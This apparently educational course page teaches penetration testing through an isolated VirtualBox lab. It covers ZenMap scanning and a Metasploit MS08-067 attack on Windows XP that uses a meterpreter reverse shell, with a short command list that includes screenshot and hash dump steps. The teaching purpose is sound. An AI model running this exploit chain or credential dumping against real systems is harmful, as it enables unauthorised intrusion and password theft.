---
layout: course
course: active
title: Penetration Testing
description: Overview of Cyber Security Topics and Career Paths
permalink: /penetration-testing/
penetration-testing: show
---
<div class="embed-responsive embed-responsive-16by9">
  <iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/BdSCIn50xjc" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div><br>

## Overview
A penetration tester tests the security of applications or networks to find vulnerabilities. Finding vulnerabilities is key to staying a step ahead of hackers who would want to do damage. In order to protect against a hacker, you must in a way think like a hacker. To get a better idea of how hacking works we will go through a demonstration of an attack.

## Environment Setup
In a previous section we setup our simulation environment with Virtualbox. For our penetration tests we want to create an isolated network to communicate between our two systems. We will be using Kali Linux and a Windows XP SP2 (Service Pack 2) machine.

If you want to following along a copy of Windows XP SP2 on ebay for less than $20. Remember this demo lab is optional so don't worry about trying to find a copy of Windows if you aren't trying this out yourself. We will use Kali for a later lab so make sure that is set up.

There are a couple of settings we need to take a look at to setup a localized network. Go to the global network settings in Virtualbox. The host network adapter and DCHCP server must be fixed. Once that is done we can go into the network settings on Kali and Windows and change them to host only adapters. Now Kali and Windows XP can communicate back and forth without accessing our actual network.

## Reconnaissance & Scanning
How do we find out who is vulnerable? Before we start actually trying to attack the Windows machine, we must know more about it. To find out more about systems on a network we go through a phases of Reconnaissance and Scanning & Enumeration. What makes these different?

### Reconnaissance
Reconnaissance is a completely passive in that we will look at all available information without actually reaching out to target systems. Usually this means finding out as much as possible about the target systems or applications by searching online.

### Scanning & Enumeration
The scanning phase is when we begin reaching out to systems on the network. This is considered our first active approach locating vulnerabilities in the target systems. In our case we are looking for specific information about about the Windows machine. Things like its location on the network (IP Address), operating system version, and available ports. With this knowledge we can narrow our focus and choose the correct exploit for the particular target machine. To scan the network we will use a tool called ZenMap.

#### Performing the Scan
Open up ZenMap by typing `zenmap &` in the terminal. We will scan a range of IP Addresses based on what our Kali Linux IP. For instance, my Kali Linux IP is 192.168.56.1 so I will scan IPs ending in 1 through 10 `192.168.56.1-10`. Enter your IP range into the target area.

Now all we need to do is choose the intensity of our scan. The drop down on the right of the target box shows us the variety of scans we can use. The three scans we will use are a ping scan, quick scan, and an intense scan. These scans describe how much information we will look get based on the scan. The increased intensity also increases the amount of noise being made during the scan.

- Ping Scan
  * A ping scan just checks to see if the door is there. So any available systems on the network will show up. In our case that should be two: Kali and Windows.
- Quick Scan
  * The quick scan will reveal what ports are available for each system. When we perform our exploit we will be connecting to one of those open ports to drop our payload.
- Intense Scan
  * The intense scan will give the most information. It will give open ports, traceroute, IP address, and operating system information. The results for the intense scan verify that the system on the local network is Windows XP SP2. This is important information since our exploit only works on Windows systems SP2 and before.

## Lab: Ms08_067 Attack Demo
This lab will go through the meat of the attack where the action happens. This is the gaining access phase.

<br>
<div class="embed-responsive embed-responsive-16by9">
  <iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/q-ZrX41cIOA" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div><br><br>


### Gaining Access
What does gaining access to a system look like. Normally you use your computer through a GUI (Graphical User Interface) where you can click on icons to navigate. Gaining access to the Windows XP system won't look the same. Our access will be restricted to just the command line interface. Good news is we can still do just as much on the command line as we can we the interface.

### Metasploit
Metasploit is a penetration testing framework that comes with Kali. We will use metasploit to configure and run our attack since it has a large database of exploits and payloads for us to pull from. Once we run the exploit a new console will pop up in our terminal. This console is part of the meterpreter payload.

At this point we have access to the windows system and have access to the windows terminal. From here we can modify information, access data, and perform other attacks. To perform additional attacks we will switch to the meterpreter console inside our terminal. Meterpreter gives us more tools to work with. We can now perform keylogging, webcam and screen recording and other attacks.

### Lab Command List (tabbed area for each section of lab)
~~~~
$ msfconsole
$ search ms08_067_netapi
$ use exploit/windows/smb/ms08_067_netapi
$ set payload windows/meterpreter/revers_tcp
$ set lhost
$ set rhost
$ show targets
$ set target {# correlated with victim system's OS}
$ show options
$ exploit

[in meterpreter console]
> ?
> run windows terminal
> create hack.txt
> screen shot
> hash dump
~~~~

## Exercise Walkthrough
### Who is on the network?
This exercise explores how we can identify vulnerable systems by network scanning. Network scanning is a useful tool for understanding how a network is laid out. Like in the attack demo we can do this scanning with Zenmap.

### Tools
- Virtualbox
- Kali Linux
- ZenMap

### Exercise Goals
- Scan the network for a system
- Identify key information about the system (IP Address, open ports, OS version etc.)

### Exercise Questions
For this assignment we will be scanning [scanme.nmap.org](scanme.nmap.org) to get familiar with scanning. Run a ping, quick, and intense scan. What is the IP Address of the website? Which ports are open and which are closed?. What operating system and version is the website running?

## Additional Resources
For more information about port scanning check out these articles:
